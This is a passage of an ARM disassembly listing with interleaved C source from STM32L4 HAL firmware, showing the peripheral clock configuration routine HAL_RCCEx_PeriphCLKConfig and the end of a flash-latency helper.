 8004568:	d001      	beq.n	800456e <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 800456a:	2301      	movs	r3, #1
 800456c:	e000      	b.n	8004570 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 800456e:	2300      	movs	r3, #0
}
 8004570:	4618      	mov	r0, r3
 8004572:	3718      	adds	r7, #24
 8004574:	46bd      	mov	sp, r7
 8004576:	bd80      	pop	{r7, pc}
 8004578:	40021000 	.word	0x40021000
 800457c:	40022000 	.word	0x40022000

08004580 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 8004580:	b580      	push	{r7, lr}
 8004582:	b086      	sub	sp, #24
 8004584:	af00      	add	r7, sp, #0
 8004586:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004588:	2300      	movs	r3, #0
 800458a:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 800458c:	2300      	movs	r3, #0
 800458e:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004590:	687b      	ldr	r3, [r7, #4]
 8004592:	681b      	ldr	r3, [r3, #0]
 8004594:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004598:	2b00      	cmp	r3, #0
 800459a:	d031      	beq.n	8004600 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 800459c:	687b      	ldr	r3, [r7, #4]
 800459e:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80045a0:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 80045a4:	d01a      	beq.n	80045dc <HAL_RCCEx_PeriphCLKConfig+0x5c>
 80045a6:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 80045aa:	d814      	bhi.n	80045d6 <HAL_RCCEx_PeriphCLKConfig+0x56>
 80045ac:	2b00      	cmp	r3, #0
 80045ae:	d009      	beq.n	80045c4 <HAL_RCCEx_PeriphCLKConfig+0x44>
 80045b0:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 80045b4:	d10f      	bne.n	80045d6 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 80045b6:	4b5d      	ldr	r3, [pc, #372]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b8:	68db      	ldr	r3, [r3, #12]
 80045ba:	4a5c      	ldr	r2, [pc, #368]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045bc:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80045c0:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 80045c2:	e00c      	b.n	80045de <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 80045c4:	687b      	ldr	r3, [r7, #4]
 80045c6:	3304      	adds	r3, #4
 80045c8:	2100      	movs	r1, #0
 80045ca:	4618      	mov	r0, r3
 80045cc:	f000 f9de 	bl	800498c <RCCEx_PLLSAI1_Config>
 80045d0:	4603      	mov	r3, r0
 80045d2:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 80045d4:	e003      	b.n	80045de <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 80045d6:	2301      	movs	r3, #1
 80045d8:	74fb      	strb	r3, [r7, #19]
      break;
 80045da:	e000      	b.n	80045de <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 80045dc:	bf00      	nop
    }

    if(ret == HAL_OK)
 80045de:	7cfb      	ldrb	r3, [r7, #19]
 80045e0:	2b00      	cmp	r3, #0
 80045e2:	d10b      	bne.n	80045fc <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 80045e4:	4b51      	ldr	r3, [pc, #324]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045e6:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80045ea:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 80045ee:	687b      	ldr	r3, [r7, #4]
 80045f0:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80045f2:	494e      	ldr	r1, [pc, #312]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045f4:	4313      	orrs	r3, r2
 80045f6:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 80045fa:	e001      	b.n	8004600 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 80045fc:	7cfb      	ldrb	r3, [r7, #19]
 80045fe:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 8004600:	687b      	ldr	r3, [r7, #4]
 8004602:	681b      	ldr	r3, [r3, #0]
 8004604:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004608:	2b00      	cmp	r3, #0
 800460a:	f000 809e 	beq.w	800474a <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 800460e:	2300      	movs	r3, #0
 8004610:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 8004612:	4b46      	ldr	r3, [pc, #280]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004614:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004616:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800461a:	2b00      	cmp	r3, #0
 800461c:	d101      	bne.n	8004622 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 800461e:	2301      	movs	r3, #1
 8004620:	e000      	b.n	8004624 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 8004622:	2300      	movs	r3, #0
 8004624:	2b00      	cmp	r3, #0
 8004626:	d00d      	beq.n	8004644 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8004628:	4b40      	ldr	r3, [pc, #256]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800462a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800462c:	4a3f      	ldr	r2, [pc, #252]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800462e:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8004632:	6593      	str	r3, [r2, #88]	; 0x58
 8004634:	4b3d      	ldr	r3, [pc, #244]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004636:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004638:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800463c:	60bb      	str	r3, [r7, #8]
 800463e:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8004640:	2301      	movs	r3, #1
 8004642:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8004644:	4b3a      	ldr	r3, [pc, #232]	; (8004730 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004646:	681b      	ldr	r3, [r3, #0]
 8004648:	4a39      	ldr	r2, [pc, #228]	; (8004730 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800464a:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800464e:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 8004650:	f7fc fdda 	bl	8001208 <HAL_GetTick>
 8004654:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004656:	e009      	b.n	800466c <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8004658:	f7fc fdd6 	bl	8001208 <HAL_GetTick>
 800465c:	4602      	mov	r2, r0
 800465e:	68fb      	ldr	r3, [r7, #12]
 8004660:	1ad3      	subs	r3, r2, r3
 8004662:	2b02      	cmp	r3, #2
 8004664:	d902      	bls.n	800466c <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 8004666:	2303      	movs	r3, #3
 8004668:	74fb      	strb	r3, [r7, #19]
        break;
 800466a:	e005      	b.n	8004678 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 800466c:	4b30      	ldr	r3, [pc, #192]	; (8004730 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800466e:	681b      	ldr	r3, [r3, #0]
 8004670:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004674:	2b00      	cmp	r3, #0
 8004676:	d0ef      	beq.n	8004658 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 8004678:	7cfb      	ldrb	r3, [r7, #19]
 800467a:	2b00      	cmp	r3, #0
 800467c:	d15a      	bne.n	8004734 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 800467e:	4b2b      	ldr	r3, [pc, #172]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004680:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004684:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004688:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 800468a:	697b      	ldr	r3, [r7, #20]
 800468c:	2b00      	cmp	r3, #0
 800468e:	d01e      	beq.n	80046ce <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004690:	687b      	ldr	r3, [r7, #4]
 8004692:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004694:	697a      	ldr	r2, [r7, #20]
 8004696:	429a      	cmp	r2, r3
 8004698:	d019      	beq.n	80046ce <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 800469a:	4b24      	ldr	r3, [pc, #144]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800469c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046a0:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80046a4:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 80046a6:	4b21      	ldr	r3, [pc, #132]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046a8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046ac:	4a1f      	ldr	r2, [pc, #124]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046ae:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80046b2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 80046b6:	4b1d      	ldr	r3, [pc, #116]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046b8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046bc:	4a1b      	ldr	r2, [pc, #108]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046be:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80046c2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 80046c6:	4a19      	ldr	r2, [pc, #100]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046c8:	697b      	ldr	r3, [r7, #20]
 80046ca:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 80046ce:	697b      	ldr	r3, [r7, #20]
 80046d0:	f003 0301 	and.w	r3, r3, #1
 80046d4:	2b00      	cmp	r3, #0
 80046d6:	d016      	beq.n	8004706 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80046d8:	f7fc fd96 	bl	8001208 <HAL_GetTick>
 80046dc:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80046de:	e00b      	b.n	80046f8 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 80046e0:	f7fc fd92 	bl	8001208 <HAL_GetTick>
 80046e4:	4602      	mov	r2, r0
 80046e6:	68fb      	ldr	r3, [r7, #12]
 80046e8:	1ad3      	subs	r3, r2, r3
 80046ea:	f241 3288 	movw	r2, #5000	; 0x1388
 80046ee:	4293      	cmp	r3, r2
 80046f0:	d902      	bls.n	80046f8 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 80046f2:	2303      	movs	r3, #3
 80046f4:	74fb      	strb	r3, [r7, #19]
            break;
 80046f6:	e006      	b.n	8004706 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80046f8:	4b0c      	ldr	r3, [pc, #48]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046fa:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046fe:	f003 0302 	and.w	r3, r3, #2
 8004702:	2b00      	cmp	r3, #0
 8004704:	d0ec      	beq.n	80046e0 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 8004706:	7cfb      	ldrb	r3, [r7, #19]
 8004708:	2b00      	cmp	r3, #0
 800470a:	d10b      	bne.n	8004724 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 800470c:	4b07      	ldr	r3, [pc, #28]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800470e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004712:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 8004716:	687b      	ldr	r3, [r7, #4]
 8004718:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800471a:	4904      	ldr	r1, [pc, #16]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800471c:	4313      	orrs	r3, r2
 800471e:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 8004722:	e009      	b.n	8004738 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 8004724:	7cfb      	ldrb	r3, [r7, #19]
 8004726:	74bb      	strb	r3, [r7, #18]
 8004728:	e006      	b.n	8004738 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 800472a:	bf00      	nop
 800472c:	40021000 	.word	0x40021000
 8004730:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004734:	7cfb      	ldrb	r3, [r7, #19]
 8004736:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004738:	7c7b      	ldrb	r3, [r7, #17]
 800473a:	2b01      	cmp	r3, #1
 800473c:	d105      	bne.n	800474a <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 800473e:	4b8a      	ldr	r3, [pc, #552]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004740:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004742:	4a89      	ldr	r2, [pc, #548]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004744:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004748:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 800474a:	687b      	ldr	r3, [r7, #4]
 800474c:	681b      	ldr	r3, [r3, #0]
 800474e:	f003 0301 	and.w	r3, r3, #1
 8004752:	2b00      	cmp	r3, #0
 8004754:	d00a      	beq.n	800476c <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 8004756:	4b84      	ldr	r3, [pc, #528]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004758:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800475c:	f023 0203 	bic.w	r2, r3, #3
 8004760:	687b      	ldr	r3, [r7, #4]
 8004762:	6a1b      	ldr	r3, [r3, #32]
 8004764:	4980      	ldr	r1, [pc, #512]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004766:	4313      	orrs	r3, r2
 8004768:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 800476c:	687b      	ldr	r3, [r7, #4]
 800476e:	681b      	ldr	r3, [r3, #0]
 8004770:	f003 0302 	and.w	r3, r3, #2
 8004774:	2b00      	cmp	r3, #0
 8004776:	d00a      	beq.n	800478e <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 8004778:	4b7b      	ldr	r3, [pc, #492]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800477a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800477e:	f023 020c 	bic.w	r2, r3, #12
 8004782:	687b      	ldr	r3, [r7, #4]
 8004784:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004786:	4978      	ldr	r1, [pc, #480]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004788:	4313      	orrs	r3, r2
 800478a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 800478e:	687b      	ldr	r3, [r7, #4]
 8004790:	681b      	ldr	r3, [r3, #0]
 8004792:	f003 0320 	and.w	r3, r3, #32
 8004796:	2b00      	cmp	r3, #0
 8004798:	d00a      	beq.n	80047b0 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 800479a:	4b73      	ldr	r3, [pc, #460]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800479c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047a0:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 80047a4:	687b      	ldr	r3, [r7, #4]
 80047a6:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80047a8:	496f      	ldr	r1, [pc, #444]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047aa:	4313      	orrs	r3, r2
 80047ac:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 80047b0:	687b      	ldr	r3, [r7, #4]
 80047b2:	681b      	ldr	r3, [r3, #0]
 80047b4:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80047b8:	2b00      	cmp	r3, #0
 80047ba:	d00a      	beq.n	80047d2 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 80047bc:	4b6a      	ldr	r3, [pc, #424]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047be:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047c2:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 80047c6:	687b      	ldr	r3, [r7, #4]
 80047c8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80047ca:	4967      	ldr	r1, [pc, #412]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047cc:	4313      	orrs	r3, r2
 80047ce:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 80047d2:	687b      	ldr	r3, [r7, #4]
 80047d4:	681b      	ldr	r3, [r3, #0]
 80047d6:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80047da:	2b00      	cmp	r3, #0
 80047dc:	d00a      	beq.n	80047f4 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 80047de:	4b62      	ldr	r3, [pc, #392]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047e0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047e4:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 80047e8:	687b      	ldr	r3, [r7, #4]
 80047ea:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80047ec:	495e      	ldr	r1, [pc, #376]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ee:	4313      	orrs	r3, r2
 80047f0:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 80047f4:	687b      	ldr	r3, [r7, #4]
 80047f6:	681b      	ldr	r3, [r3, #0]
 80047f8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80047fc:	2b00      	cmp	r3, #0
 80047fe:	d00a      	beq.n	8004816 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 8004800:	4b59      	ldr	r3, [pc, #356]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004802:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004806:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 800480a:	687b      	ldr	r3, [r7, #4]
 800480c:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800480e:	4956      	ldr	r1, [pc, #344]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004810:	4313      	orrs	r3, r2
 8004812:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 8004816:	687b      	ldr	r3, [r7, #4]
 8004818:	681b      	ldr	r3, [r3, #0]
 800481a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800481e:	2b00      	cmp	r3, #0
 8004820:	d00a      	beq.n	8004838 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 8004822:	4b51      	ldr	r3, [pc, #324]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004824:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004828:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 800482c:	687b      	ldr	r3, [r7, #4]
 800482e:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004830:	494d      	ldr	r1, [pc, #308]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004832:	4313      	orrs	r3, r2
 8004834:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 8004838:	687b      	ldr	r3, [r7, #4]
 800483a:	681b      	ldr	r3, [r3, #0]
 800483c:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8004840:	2b00      	cmp	r3, #0
 8004842:	d028      	beq.n	8004896 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 8004844:	4b48      	ldr	r3, [pc, #288]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004846:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800484a:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 800484e:	687b      	ldr	r3, [r7, #4]
 8004850:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004852:	4945      	ldr	r1, [pc, #276]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004854:	4313      	orrs	r3, r2
 8004856:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 800485a:	687b      	ldr	r3, [r7, #4]
 800485c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 800485e:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004862:	d106      	bne.n	8004872 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004864:	4b40      	ldr	r3, [pc, #256]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004866:	68db      	ldr	r3, [r3, #12]
 8004868:	4a3f      	ldr	r2, [pc, #252]	; (8004968 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
